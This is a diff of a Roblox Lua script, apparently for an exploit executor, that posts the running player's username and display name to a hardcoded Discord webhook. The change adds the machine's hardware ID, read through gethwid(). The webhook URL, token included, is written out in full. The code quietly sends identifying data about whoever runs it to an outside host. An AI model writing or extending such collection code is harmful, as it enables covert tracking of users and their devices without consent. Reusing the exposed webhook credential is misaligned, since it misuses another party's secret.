@@ -1,8 +1,11 @@
---#5
+--#6
 local HttpService = game:GetService("HttpService")
 local player = game:GetService("Players").LocalPlayer
 local webhookURL = "https://discord.com/api/webhooks/1372904210370265259/p-Z-klz9ywB-WpHuvrPCjPRt23me00hA_cC2Jh1XHLtNUvLHFG0c4khAbWe4jGO04s-k"
 local imageUrl = "https://cdn.discordapp.com/attachments/1450978230742814841/1503442500512256201/IMG_0745.png?ex=6a035d70&is=6a020bf0&hm=06687d0b8e8c6956f5dd0af3adca4901409ca9d95ef1f8726a208acf7d2685ab&"
+
+-- ดึงค่า HWID (รองรับเกือบทุก Executor)
+local hwid = gethwid and gethwid() or "Not Supported"
 
 local data = {
     ["embeds"] = {{
@@ -12,7 +15,7 @@ local data = {
         ["fields"] = {
             {
                 ["name"] = "----------------------------",
-                ["value"] = string.format("**Username:** @%s\n**Display Name:** %s", player.Name, player.DisplayName),
+                ["value"] = string.format("**Username:** @%s\n**Display Name:** %s\n**Hwid:** `%s`", player.Name, player.DisplayName, hwid),
                 ["inline"] = false
             },
             {
